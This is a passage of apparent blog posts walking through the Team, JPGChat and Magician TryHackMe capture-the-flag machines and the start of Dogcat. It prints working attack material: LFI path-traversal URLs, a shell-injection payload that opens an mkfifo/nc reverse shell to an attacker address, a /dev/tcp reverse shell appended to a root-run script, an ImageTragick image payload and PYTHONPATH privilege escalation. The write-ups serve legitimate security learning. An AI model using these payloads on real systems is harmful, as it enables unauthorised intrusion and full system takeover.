-rwxr-xr-x 1 1002 1002 269 Jan 15 20:24 New_site.txt 226 Directory send OK. ftp\u0026gt; get New_site.txt local: New_site.txt remote: New_site.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for New_site.txt (269 bytes). 226 Transfer complete. 269 bytes received in 0.00 secs (4.1377 MB/s)   We will download New_site.txt from the workshare directory and read its content. Thanks to the found note we have a subdomain which resolves to\ndev.team.thm\n1 2 3 4 5 6 7 8  cat New_site.txt Dale I have started coding a new website in PHP for the team to use, this is currently under development. It can be found at \u0026#34;.dev\u0026#34; within our domain. Also as per the team policy please make a copy of your \u0026#34;id_rsa\u0026#34; and place this in the relevent config file. Gyles   Further Enumeration 1 2 3 4 5 6 7 8 9 10 11  ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; cd .ssh 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwx------ 2 1002 1002 4096 Jan 15 20:24 . drwxr-xr-x 5 65534 65534 4096 Jan 15 20:25 .. -rw-r--r-- 1 1002 1002 222 Jan 15 20:24 known_hosts 226 Directory send OK.   1 2  cat known_hosts |1|lzgG+5zzzbENxEXceLc922zRWDg=|fx7l2fmESZ9VBzXebFzfAlM451M= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBcvf0EqbWNp1pqXNP47piGmO64E1teH6vV4u5utrwpXE/9KereXvPL2AYcfzhrA/RO+PEjp9oh++xknJPp/VF0=   Subdomain Enumeration \nClicking on the link, we will see that it includes teamshare.php file as shown below.\nhttp://dev.team.thm/script.php?page=teamshare.php\nBased on this, we can assume that this site is vulnerable to Local File Inclusion.\nWe can simply verify it with accessing passwd file inside etc directory.\nhttp://dev.team.thm/script.php?page=../../../../etc/passwd\n\nLFI Let us use OWASP ZAP to perform fuzzing on the found subdomain.\n Right click on the URL in the history and navigate to Attack and then Fuzz\nHighlight /etc/passwd and select Add and then Add once again\nSelect a file which will be used as a wordlist For example : /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \nClick OK and then Start Fuzzer\n \n\nGoing through the fuzzing output and comparing sizes, we will notice /etc/ssh/sshd_config which contains Dale\u0026rsquo;s Private Key.\n\nWe will save its content to the file on our local machine and then we will change its permissions with chmod +600\nGaining Access Found private key will be used for SSH authentication.\n1 2 3 4 5 6  ssh -i id_rsa dale@10.10.135.37 Last login: Mon Jan 18 10:51:32 2021 dale@TEAM:~$ whoami;id;hostname dale uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors) TEAM   Users flag is located inside the dale\u0026rsquo;s home directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  dale@TEAM:~$ ls -la total 332 drwxr-xr-x 6 dale dale 4096 Mar 8 17:55 . drwxr-xr-x 5 root root 4096 Jan 15 20:21 .. -rw------- 1 dale dale 2549 Jan 21 19:20 .bash_history -rw-r--r-- 1 dale dale 220 Jan 15 19:52 .bash_logout -rw-r--r-- 1 dale dale 3771 Jan 15 19:52 .bashrc drwx------ 2 dale dale 4096 Jan 15 19:54 .cache drwx------ 3 dale dale 4096 Jan 15 22:20 .gnupg drwxrwxr-x 3 dale dale 4096 Jan 15 21:29 .local -rw-r--r-- 1 dale dale 807 Jan 15 19:52 .profile drwx------ 2 dale dale 4096 Jan 15 20:15 .ssh -rw-r--r-- 1 dale dale 0 Jan 15 19:55 .sudo_as_admin_successful -rw-rw-r-- 1 dale dale 17 Jan 15 21:30 user.txt dale@TEAM:~$ cat user.txt | wc -c 17   Running sudo -l command, we will check our sudo permissions.\n1 2 3 4 5 6  dale@TEAM:~$ sudo -l Matching Defaults entries for dale on TEAM: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dale may run the following commands on TEAM: (gyles) NOPASSWD: /home/gyles/admin_checks   Based on the output above, there is a file we can run as a user gyles called admin_checks.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  dale@TEAM:/home$ cd gyles/ dale@TEAM:/home/gyles$ ls -la total 48 drwxr-xr-x 6 gyles gyles 4096 Jan 17 19:47 . drwxr-xr-x 5 root root 4096 Jan 15 20:21 .. -rwxr--r-- 1 gyles editors 399 Jan 15 21:52 admin_checks -rw------- 1 gyles gyles 5639 Jan 17 20:34 .bash_history -rw-r--r-- 1 gyles gyles 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 gyles gyles 3771 Apr 4 2018 .bashrc drwx------ 2 gyles gyles 4096 Jan 15 21:38 .cache drwx------ 3 gyles gyles 4096 Jan 15 21:38 .gnupg drwxrwxr-x 3 gyles gyles 4096 Jan 15 21:51 .local -rw-r--r-- 1 gyles gyles 807 Apr 4 2018 .profile drwx------ 2 gyles gyles 4096 Jan 15 21:43 .ssh -rw-r--r-- 1 gyles gyles 0 Jan 17 15:05 .sudo_as_admin_successful   Found script is taking user input and assigning it to the value of $error. Then it is sending it right to the shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  dale@TEAM:/home/gyles$ cat admin_checks #!/bin/bash printf \u0026#34;Reading stats.\\n\u0026#34; sleep 1 printf \u0026#34;Reading stats..\\n\u0026#34; sleep 1 read -p \u0026#34;Enter name of person backing up the data: \u0026#34; name echo $name \u0026gt;\u0026gt; /var/stats/stats.txt read -p \u0026#34;Enter \u0026#39;date\u0026#39; to timestamp the file: \u0026#34; error printf \u0026#34;The Date is \u0026#34; $error 2\u0026gt;/dev/null date_save=$(date \u0026#34;+%F-%H-%M\u0026#34;) cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf \u0026#34;Stats have been backed up\\n\u0026#34;   Lateral Movement We will supply the script with /bin/bash which will spawn a shell that belongs to a user gyles.\n1 2 3 4 5 6 7 8 9  dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: gyles Enter \u0026#39;date\u0026#39; to timestamp the file: /bin/bash The Date is whoami gyles   Stabilize our shell with the following command.\n1 2 3  which python3 /usr/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   We will transfer linPEAS and use it for system enumeration.\nSpawn a python server on the target machine.\n1 2  gyles@TEAM:~$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...   Then we will use scp on our local machine to transfer this script.\n1 2  scp -i id_rsa /opt/LinPEAS/linpeas.sh dale@10.10.135.37:8000 linpeas.sh 100% 286KB 101.1KB/s 00:02   Going through the enumeration output, linPEAS found group writable files in dave\u0026rsquo;s home directory. Especially we are interested in main_backup.sh. Also there is a directory called admin_stuff in the opt directory.\n1 2 3 4 5 6 7 8 9 10  [+] Interesting GROUP writable files (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files Group gyles: /home/gyles/.local Group editors: /var/stats/stats.txt Group admin: /usr/local/bin /usr/local/bin/main_backup.sh /opt/admin_stuff   Privilege Escalation Found script is writable by root and members in the admin group. Our user gyles is in the admin group meaning we have access to modify the file’s contents.\n1 2 3 4 5 6 7 8 9  gyles@TEAM:~$ cd /usr/local/bin/ gyles@TEAM:/usr/local/bin$ ls -la total 12 drwxrwxr-x 2 root admin 4096 Jan 17 20:36 . drwxr-xr-x 10 root root 4096 Jan 15 19:49 .. -rwxrwxr-x 1 root admin 65 Jan 17 20:36 main_backup.sh gyles@TEAM:/usr/local/bin$ cat main_backup.sh #!/bin/bash cp -r /var/www/team.thm/* /var/backups/www/team.thm/   We will append a bash reverse shell at the end of this file and then we will start a listener on our local machine.\n1  bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PORT 0\u0026gt;\u0026amp;1   And we a have a root shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.135.37] 49082 bash: cannot set terminal process group (23529): Inappropriate ioctl for device bash: no job control in this shell root@TEAM:~# whoami whoami root root@TEAM:~# pwd pwd /root root@TEAM:~# ls -la ls -la total 52 drwx------ 6 root root 4096 Jan 17 19:28 . drwxr-xr-x 23 root root 4096 Jan 15 19:51 .. -rw------- 1 root root 7068 Jan 21 19:20 .bash_history -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 2 root root 4096 Jan 15 22:10 .cache drwx------ 4 root root 4096 Jan 15 22:18 .gnupg drwxr-xr-x 3 root root 4096 Jan 15 20:30 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 18 Jan 15 21:26 root.txt -rw-r--r-- 1 root root 66 Jan 17 16:07 .selected_editor drwx------ 2 root root 4096 Jan 15 20:00 .ssh -rw-r--r-- 1 root root 0 Jan 16 22:42 .sudo_as_admin_successful -rw-r--r-- 1 root root 215 Jan 17 14:57 .wget-hsts root@TEAM:~# cat root.txt | wc -c cat root.txt | wc -c 18   \rThank you for reading this blog post.\n","description":"Beginner friendly boot2root machine","id":11,"section":"posts","tags":["enumeration","ftp","lfi","privilege escalation"],"title":"Team [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/team/"},{"content":"   Title  JPGChat     Info  Exploiting poorly made custom chatting service written in a certain language.   Difficulty  Easy   Date 2021/03/01    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.252.52\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  nmap -p- -A -T4 10.10.252.52 Nmap scan report for 10.10.252.52 Host is up (0.070s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA) | 256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA) |_ 256 82:1d:6b🆎2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519) 3000/tcp open ppp? | fingerprint-strings: | GenericLines, NULL: | Welcome to JPChat | source code of this service can be found at our admin\u0026#39;s github | MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel |_ REPORT USAGE: use [REPORT] to report someone to the admins (with proof)   Unknown Service Let\u0026rsquo;s try to connect with netcat.\n1 2 3 4 5 6 7  nc 10.10.252.52 3000 Welcome to JPChat the source code of this service can be found at our admin\u0026#39;s github MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel REPORT USAGE: use [REPORT] to report someone to the admins (with proof)   We can use [MESSAGE] or [REPORT] keywords to interact with the service.\n HINT: Can you get the applications source code, this can be found at the admins github. Where could we be able to find the admins name? Check out the whole application.\n Based on the hint, we will search on Github for jpchat.\nGoing through the search results, we will find the source code for the service running on the port 3000.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #!/usr/bin/env python3 import os print (\u0026#39;Welcome to JPChat\u0026#39;) print (\u0026#39;the source code of this service can be found at our admin\\\u0026#39;s github\u0026#39;) def report_form(): print (\u0026#39;this report will be read by Mozzie-jpg\u0026#39;) your_name = input(\u0026#39;your name:\\n\u0026#39;) report_text = input(\u0026#39;your report:\\n\u0026#39;) os.system(\u0026#34;bash -c \u0026#39;echo %s\u0026gt; /opt/jpchat/logs/report.txt\u0026#39;\u0026#34; % your_name) os.system(\u0026#34;bash -c \u0026#39;echo %s\u0026gt;\u0026gt; /opt/jpchat/logs/report.txt\u0026#39;\u0026#34; % report_text) def chatting_service(): print (\u0026#39;MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel\u0026#39;) print (\u0026#39;REPORT USAGE: use [REPORT] to report someone to the admins (with proof)\u0026#39;) message = input(\u0026#39;\u0026#39;) if message == \u0026#39;[REPORT]\u0026#39;: report_form() if message == \u0026#39;[MESSAGE]\u0026#39;: print (\u0026#39;There are currently 0 other users logged in\u0026#39;) while True: message2 = input(\u0026#39;[MESSAGE]: \u0026#39;) if message2 == \u0026#39;[REPORT]\u0026#39;: report_form() chatting_service()   No other keywords were reveled, but we will notice that if we use [REPORT] our input is used with echo as a bash command. Because there is no sanitization of user input, we can easily abuse it by escaping echo with ';, then writing our payload and then commenting everything else after our payload with #\nGaining Access Based on the findings above, we will create following line and use it as an input after the [REPORT] keyword. Before that, we will start a listener on our local machine.\n1  \u0026#39;; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.9.140.180 4444 \u0026gt;/tmp/f #   1 2 3 4 5 6 7 8  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.252.52] 33746 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id;whoami;hostname uid=1001(wes) gid=1001(wes) groups=1001(wes) wes ubuntu-xenial   We successfully obtained reverse shell via Remote Code Execution.\nThe next step will be stabilizing our shell and grabbing the user flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  $ python3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; wes@ubuntu-xenial:/$ export TERM=xterm export TERM=xterm wes@ubuntu-xenial:/$ ^Z [1]+ Stopped nc -lnvp 4444 stty raw -echo;fg nc -lnvp 4444 wes@ubuntu-xenial:/$ cd ~ wes@ubuntu-xenial:~$ ls -la total 24 drwxr-xr-x 2 wes wes 4096 Jan 15 18:58 . drwxr-xr-x 3 root root 4096 Jan 15 18:57 .. -rw------- 1 wes wes 0 Jan 15 18:58 .bash_history -rw-r--r-- 1 wes wes 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 wes wes 3771 Aug 31 2015 .bashrc -rw-r--r-- 1 wes wes 655 Jul 12 2019 .profile -rw-r--r-- 1 root root 38 Jan 15 18:58 user.txt wes@ubuntu-xenial:~$ cat user.txt | wc -c 38   Privilege Escalation By issuing sudo -l we can see which commands we can execute as root and some other important information.\n1 2 3 4 5 6  wes@ubuntu-xenial:~$ sudo -l Matching Defaults entries for wes on ubuntu-xenial: mail_badpass, env_keep+=PYTHONPATH User wes may run the following commands on ubuntu-xenial: (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py   Based on the output above, we can run test_module.py as root. Also thanks to env_keep+=PYTHONPATH we are allowed to add other paths where python can find its libraries.\nThis test_module.py script is owned by root, but we have a read permission.\n1 2 3 4 5 6  wes@ubuntu-xenial:~$ cat /opt/development/test_module.py #!/usr/bin/env python3 from compare import * print(compare.Str(\u0026#39;hello\u0026#39;, \u0026#39;hello\u0026#39;, \u0026#39;hello\u0026#39;))   We will take advantage of import to create our own with pty module to spawn a bash.\n1 2 3 4 5 6 7 8 9 10  wes@ubuntu-xenial:~$ touch compare.py wes@ubuntu-xenial:~$ echo \u0026#34;import pty\u0026#34; \u0026gt; compare.py wes@ubuntu-xenial:~$ echo \u0026#34;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; \u0026gt;\u0026gt; compare.py wes@ubuntu-xenial:~$ echo \u0026#34;exit()\u0026#34; \u0026gt;\u0026gt; compare.py wes@ubuntu-xenial:~$ cat compare.py import pty pty.spawn(\u0026#39;/bin/bash\u0026#39;) exit() wes@ubuntu-xenial:~$ cp compare.py /tmp   Now we will force python to look up for the library in our directory (/tmp).\n1  wes@ubuntu-xenial:~$ export PYTHONPATH=/tmp   At last we will execute the python script as root to escalate our privileges.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  wes@ubuntu-xenial:/tmp$ sudo /usr/bin/python3 /opt/development/test_module.py root@ubuntu-xenial:~# id uid=0(root) gid=0(root) groups=0(root) root@ubuntu-xenial:~# cd /root root@ubuntu-xenial:/root# ls -la total 24 drwx------ 3 root root 4096 Jan 15 18:58 . drwxr-xr-x 25 root root 4096 Mar 1 13:27 .. -rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 305 Jan 15 18:58 root.txt drwx------ 2 root root 4096 Jan 15 18:56 .ssh root@ubuntu-xenial:/root# cat root.txt | wc -c 305   \rThank you for reading this blog post.\n","description":"Exploiting poorly made custom chatting service written in a certain language.","id":12,"section":"posts","tags":["enumeration","python","privilege escalation"],"title":"JPGChat [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/jpgchat/"},{"content":"   Title  Magician     Info  This magical website lets you convert image file formats.   Difficulty  Easy   Date 2021/02/25    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.50.10\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  Nmap scan report for 10.10.50.10 Host is up (0.073s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Vary: Origin | Vary: Access-Control-Request-Method | Vary: Access-Control-Request-Headers | Content-Type: application/json | Date: Thu, 25 Feb 2021 08:11:33 GMT | Connection: close | {\u0026#34;timestamp\u0026#34;:\u0026#34;2021-02-25T08:11:34.013+0000\u0026#34;,\u0026#34;status\u0026#34;:404,\u0026#34;error\u0026#34;:\u0026#34;Not Found\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;No message available\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/nice%20ports%2C/Tri%6Eity.txt%2ebak\u0026#34;} | GetRequest: | HTTP/1.1 404 | Vary: Origin | Vary: Access-Control-Request-Method | Vary: Access-Control-Request-Headers | Content-Type: application/json | Date: Thu, 25 Feb 2021 08:11:33 GMT | Connection: close | {\u0026#34;timestamp\u0026#34;:\u0026#34;2021-02-25T08:11:33.521+0000\u0026#34;,\u0026#34;status\u0026#34;:404,\u0026#34;error\u0026#34;:\u0026#34;Not Found\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;No message available\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/\u0026#34;} | HTTPOptions: | HTTP/1.1 404 | Vary: Origin | Vary: Access-Control-Request-Method | Vary: Access-Control-Request-Headers | Content-Type: application/json | Date: Thu, 25 Feb 2021 08:11:33 GMT | Connection: close | {\u0026#34;timestamp\u0026#34;:\u0026#34;2021-02-25T08:11:33.684+0000\u0026#34;,\u0026#34;status\u0026#34;:404,\u0026#34;error\u0026#34;:\u0026#34;Not Found\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;No message available\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/\u0026#34;} | RTSPRequest: | HTTP/1.1 505 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 465 | Date: Thu, 25 Feb 2021 08:11:33 GMT | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 505 | HTTP Version Not Supported\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 505 |_ HTTP Version Not Supported\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; |_http-title: Site doesn\u0026#39;t have a title (application/json). 8081/tcp open http nginx 1.14.0 (Ubuntu) |_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: magician   Service on port 8080\n This port doesn\u0026rsquo;t reveal anything, so we will move onto another port found with nmap.  \nService on port 8081\n Here we have a web application converting PNG to JPG images.  \nFTP Using Anonymous username to authenticate, we are lucky and after some time we are welcomed with a message from the admin. We are pointed to this website: https://imagetragick.com\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ftp 10.10.50.10 Connected to 10.10.50.10. 220 THE MAGIC DOOR Name (10.10.50.10:root): Anonymous 331 Please specify the password. Password: 230-Huh? The door just opens after some time? You\u0026#39;re quite the patient one, aren\u0026#39;t ya, it\u0026#39;s a thing called \u0026#39;delay_successful_login\u0026#39; in /etc/vsftpd.conf ;) Since you\u0026#39;re a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though... 230 Login successful. ftp\u0026gt; ls -la 550 Permission denied. ftp: bind: Address already in use ftp\u0026gt;   Directory Brute-Forcing  Using this method, nothing useful can found this time.  Web Application Exploit CVE-2016–3714\nVisiting the website found previously we can read more about ImageMagick, a package commonly used by web services to process images. One of the vulnerabilities can lead to Remote Code Execution (RCE) if you process user submitted images.\n Insufficient filtering for filename passed to delegate\u0026rsquo;s command allows remote code execution during conversion of several file formats.\n We will modify the proposed image content with a bash reverse shell payload.\nThen we will save the lines below as shell.png and upload it to the web application.\n1 2 3 4 5 6 7 8  push graphic-context encoding \u0026#34;UTF-8\u0026#34; viewbox 0 0 1 1 affine 1 0 0 1 0 0 push graphic-context image Over 0,0 1,1 \u0026#39;|/bin/sh -i \u0026gt; /dev/tcp/IP/PORT 0\u0026lt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#39; pop graphic-context pop graphic-context   Before pressing UPLOAD AND CONVERT button we will start a listener on our local machine.\nGaining Access 1 2 3 4 5 6 7 8 9 10  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.50.10] 42844 sh: cannot set terminal process group (936): Inappropriate ioctl for device sh: no job control in this shell sh-4.4$ id;whoami;hostname id;whoami;hostname uid=1000(magician) gid=1000(magician) groups=1000(magician) magician magician   From the output above, we can see that attacker\u0026rsquo;s machine connected to our listener.\nShell Stabilization To determine which python version is present on the machine, we will run which python. Then we will proceed with basic shell stabilization commands.\n1 2 3 4 5 6 7 8 9  sh-4.4$ which python which python /usr/bin/python python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;; magician@magician:/tmp/hsperfdata_magician$ export TERM=xterm magician@magician:/tmp/hsperfdata_magician$ ^Z [1]+ Stopped nc -lnvp 4444 stty raw -echo; fg magician@magician:/tmp/hsperfdata_magician$   User Flag User flag is located inside the magician\u0026rsquo;s home directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  magician@magician:/tmp/hsperfdata_magician/uploads$ cd ~ magician@magician:~$ ls -la total 17204 drwxr-xr-x 5 magician magician 4096 Feb 13 07:19 . drwxr-xr-x 3 root root 4096 Jan 30 10:43 .. lrwxrwxrwx 1 magician magician 9 Feb 6 13:38 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 magician magician 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 magician magician 3771 Apr 4 2018 .bashrc drwx------ 2 magician magician 4096 Jan 30 10:43 .cache drwx------ 3 magician magician 4096 Jan 30 10:43 .gnupg -rw-r--r-- 1 magician magician 807 Apr 4 2018 .profile -rw-r--r-- 1 magician magician 0 Jan 30 10:43 .sudo_as_admin_successful -rw------- 1 magician magician 7546 Jan 31 03:50 .viminfo -rw-r--r-- 1 root root 17565546 Jan 30 11:55 spring-boot-magician-backend-0.0.1-SNAPSHOT.jar -rw-r--r-- 1 magician magician 170 Feb 13 07:19 the_magic_continues drwxr-xr-x 2 root root 4096 Feb 5 05:14 uploads -rw-r--r-- 1 magician magician 24 Jan 30 11:30 user.txt magician@magician:~$ cat user.txt | wc -c 24   Privilege Escalation Local Service 1 2  magician@magician:~$ cat the_magic_continues The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.   Text file the_magic_continues provides us with a hint \u0026ldquo;locally listening\u0026rdquo; which probably means that there is a service running locally.\nTo see these services we will use netstat -tulpn\n   Flag  Description     -t  TCP   -u  UDP   -l Show only listening sockets.   -n  Show numerical addresses instead of trying to determine symbolic host, port or user names.   -p Show the PID and name of the program to which each socket belongs.    1 2 3 4 5 6 7 8 9 10 11 12  magician@magician:~$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:8081 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:6666 0.0.0.0:* LISTEN - tcp6 0 0 :::8080 :::* LISTEN 936/java tcp6 0 0 :::21 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 10.10.50.10:68 0.0.0.0:* -   From the output above, we can see that there is a service running locally on the port 6666 (127.0.0.1:6666).\nTraffic Tunneling To forward traffic from the found port 6666 to our machine we will use chisel.\n1 2  sudo apt-get install chisel cp /usr/bin/chisel /opt/   Then we will copy chisel binary to a directory from which we will start a python server for transferring this file.\n1  python3 -m http.server 8080   On the target machine we will use wget to download the binary and then we will add execution permission.\n1 2 3 4 5 6 7 8 9 10 11  magician@magician:/tmp$ wget 10.9.140.180:8080/chisel --2021-02-25 11:38:51-- http://10.9.140.180:8080/chisel Connecting to 10.9.140.180:8080... connected. HTTP request sent, awaiting response... 200 OK Length: 8750072 (8.3M) [application/octet-stream] Saving to: ‘chisel’ chisel 100%[===================\u0026gt;] 8.34M 128KB/s in 84s 2021-02-25 11:40:16 (101 KB/s) - ‘chisel’ saved [8750072/8750072] magician@magician:/tmp$ chmod +x chisel   On the local machine, we will use the command below to create a server with port 9000 for reversed traffic from the port on the target machine.\n1  chisel server -p 9000 --reverse -v   On the target machine, we will create a client with port set to 7777, which will be able accessible from our machine.\n1  ./chisel client 10.9.140.180:9000 R:10.9.140.180:7777:127.0.0.1:6666   We can now access the service locally in our browser.\n\nThe root flag can be obtained by inputting a full path to the file as shown below.\nThe output is encoded to base64 so we can use CyberChef to decode its content.\n\nThe same way can obtain passwd and shadow files and then we might be able to crack some hashes and hopefully escalate our privileges.\n\rThank you for reading this blog post.\n","description":"This magical website lets you convert image file formats.","id":13,"section":"posts","tags":["enumeration","ftp","reverse SSH","decoding"],"title":"Magician [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/magician/"},{"content":"   Title  Dogcat     Info  I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.   Difficulty  Medium   Date 2021/02/19    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.19.192\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  Nmap scan report for 10.10.19.192 Host is up (0.11s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA) | 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA) |_ 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.38 (Debian) |_http-title: dogcat No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   Since we do not have a SSH username or password, we will continue with port 80. Here we have a page which gives us an option to see a dog or a cat picture.\n\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u 10.10.19.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.19.192 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/19 09:24:53 Starting gobuster =============================================================== http://10.10.19.192/cats (Status: 301) http://10.10.19.192/dogs (Status: 301)   Two directories were found but we don\u0026rsquo;t have permission to access these resources.\nLocal File Inclusion Upon interaction with the two buttons a new query is added to URL /?view=dog and /?view=cat respectively.\nWhen we click either one of the buttons, we get the index page with a random dog or cat image.\n\nFrom this point we can assume that as a vector we will use Directory Traversal attack.\nTo bypass any check, we will encode an index page to base64 and then we will use CyberChef  to decode this php file back.\n1  http://10.10.19.192/?view=php://filter/read=convert.base64-encode/resource=dog/../index   \nThe encoded string is appended right after \u0026ldquo;Here you go!\u0026rdquo; message.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 